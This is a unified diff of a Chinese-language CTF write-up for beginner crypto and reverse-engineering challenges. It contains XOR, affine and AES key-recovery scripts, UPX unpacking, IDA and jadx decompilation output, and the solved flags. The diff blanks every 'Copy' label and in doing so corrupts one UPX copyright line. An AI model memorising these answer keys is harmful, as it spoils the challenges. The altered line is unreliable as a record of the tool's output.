@@ -2060,7 +2060,7 @@ print(bytes(ciphertext).hex())
 
 知道明文前五位为 `flag{` ，通过异或密文前五位来得出 `key` ，python 脚本如下
 
-Copy
+ 
 
 ```
 ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
@@ -2073,7 +2073,7 @@ print("Partial key:", bytes(partial_key))
 
 可以得出 key 为 `\x8f` ，通过遍历异或整串密文就可以得到 flag，脚本如下
 
-Copy
+ 
 
 ```
 ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
@@ -2084,7 +2084,7 @@ print(bytes([ciphertext[i] ^ key for i in range(36)]))
 
 ### [Week 1]Affine
 
-Copy
+ 
 
 ```
 from flag import flag, key
@@ -2111,7 +2111,7 @@ print(bytes(ciphertext).hex())
 
 根据已知明文 `flag{` 爆破出逆元后通过解出的 `key[0]` 和 `key[1]` 代入求解即可，脚本如下
 
-Copy
+ 
 
 ```
 def mod_inverse(a, m):
@@ -2139,7 +2139,7 @@ for k0 in range(256):
 
 ### [Week 1]babyaes
 
-Copy
+ 
 
 ```
 from Crypto.Cipher import AES
@@ -2172,7 +2172,7 @@ if __name__ == "__main__":
 
 由于此时的 key 为 32bit，而 iv 为 16bit，因此解出来的值得前半段就是 key 值，再通过将前半段异或后半段即可得到 iv 值，脚本如下
 
-Copy
+ 
 
 ```
 xor_result = 3657491768215750635844958060963805125333761387746954618540958489914964573229
@@ -2187,7 +2187,7 @@ print(f'iv = {iv}')
 
 将解出的 key 和 iv 丢进 AES 中进行解密即可得到 flag，完整脚本如下
 
-Copy
+ 
 
 ```
 from Crypto.Cipher import AES
@@ -2226,7 +2226,7 @@ print(dec_flag)
 
 故 flag 如下
 
-Copy
+ 
 
 ```
 flag{we1c0me_to_rev3rse!!}}
@@ -2240,12 +2240,12 @@ flag{we1c0me_to_rev3rse!!}}
 
 需要使用 upx 去壳，如下
 
-Copy
+ 
 
 ```
 $ upx -d "KE.exe"
                        Ultimate Packer for eXecutables
-                          Copyright (C) 1996 - 2020
+                           right (C) 1996 - 2020
 UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
 
         File size         Ratio      Format      Name
@@ -2257,7 +2257,7 @@ Unpacked 1 file.
 
 去壳完成后用 ida64 打开，通过反编译可以得到以下内容
 
-Copy
+ 
 
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -2290,7 +2290,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 并且可以找到
 
-Copy
+ 
 
 ```
 enc = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
@@ -2298,7 +2298,7 @@ enc = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
 
 通过分析可得该函数将密文是由明文的每个字符转ascii值后加一得到的，要得到明文则将每个字符的ascii值减一即可。
 
-Copy
+ 
 
 ```
 str = "gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~"
@@ -2312,7 +2312,7 @@ for s in str:
 
 百度 `IDA的Segments窗口要怎么打开呢` ，可以得到结果 `Shift+F7` ，将 Segments 窗口中的 name 拼凑起来就是 flag。
 
-Copy
+ 
 
 ```
 flag{You_ar3_g0od_at_f1nding_ELF_segments_name}
@@ -2322,7 +2322,7 @@ flag{You_ar3_g0od_at_f1nding_ELF_segments_name}
 
 用 ida64 打开，通过反编译可以得到以下内容
 
-Copy
+ 
 
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -2372,7 +2372,7 @@ _BYTE *__fastcall encode(const char *a1)
 
 通过分析可知密文是由明文的每个字符与 0x20 进行异或后加 16 并进行 base64 编码得到的，要得到明文则先进行 base64 解码后将所得的每个位减去 16 再和 0x20 异或即可，脚本如下。
 
-Copy
+ 
 
 ```
 import base64
@@ -2390,7 +2390,7 @@ for s in decoded_bytes:
 
 用 ida64 打开，通过反编译可以得到以下内容
 
-Copy
+ 
 
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -2420,7 +2420,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 并且 array 数组内容如下
 
-Copy
+ 
 
 ```
 array = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
@@ -2428,7 +2428,7 @@ array = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819]
 
 通过分析可知密文是通过将明文每四个为一组和 0x12345678 进行异或后得到的，但由于是低位存储，所以需要将每一组逆向过来的值进行反向即可得到 flag，脚本如下
 
-Copy
+ 
 
 ```
 from Crypto.Util.number import long_to_bytes
@@ -2448,7 +2448,7 @@ for data in array_data:
 
 可以在上述引用中下载 apktool ，下载后使用 apktool 进行逆向
 
-Copy
+ 
 
 ```
 $ apktool d AndroXor.apk
@@ -2456,7 +2456,7 @@ $ apktool d AndroXor.apk
 
 逆向后使用 jadx 打开进行 Java 反编译，在 `com/chick.androxor/MainActivity` 中存在以下内容
 
-Copy
+ 
 
 ```
     public String Xor(String str, String str2) {
@@ -2496,7 +2496,7 @@ Copy
 
 因此要获得明文需要对应位置逐个异或运算推回来即可，先将 cArr 数字中的其他值都转化为 ascii 值形态，再进行异或运算，将运算结果转回字符即可，脚本如下
 
-Copy
+ 
 
 ```
 cArr = [14, '\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\n', 2, '\f', '>', '(', '@', 11, '\'', 'K', 'Y', 25, 'A', '\r']
@@ -2527,7 +2527,7 @@ print(str)
 
 用 ida64 打开，通过反编译可以得到以下内容
 
-Copy
+ 
 
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -2551,7 +2551,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 并且 data 数组内容如下
 
-Copy
+ 
 
 ```
 array_data = [
@@ -2564,7 +2564,7 @@ array_data = [
 
 通过分析可得密文由将明文的每个字符与其下一个字符以及当前 index 值进行异或运算，并将结果赋值给当前字符，因此要逆向回来只需要倒转反过来即可，脚本如下
 
-Copy
+ 
 
 ```
 array_data = [
@@ -2589,7 +2589,7 @@ print(''.join(chr(data) for data in array_data))
 
 ![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FZl7WLJOue4Uv9zlfSF1T%252Flazy_activtiy-1.png%3Falt%3Dmedia%26token%3D36498bef-15b7-4f75-a37b-1e899525c9b5&width=768&dpr=4&quality=100&sign=7a8856c106556e0aeea2da78dd92d611d36371a3bf0417237ca6d33703e40e46)
 
-Copy
+ 
 
 ```
 flag{Act1v1ty_!s_so00oo0o_Impor#an#}
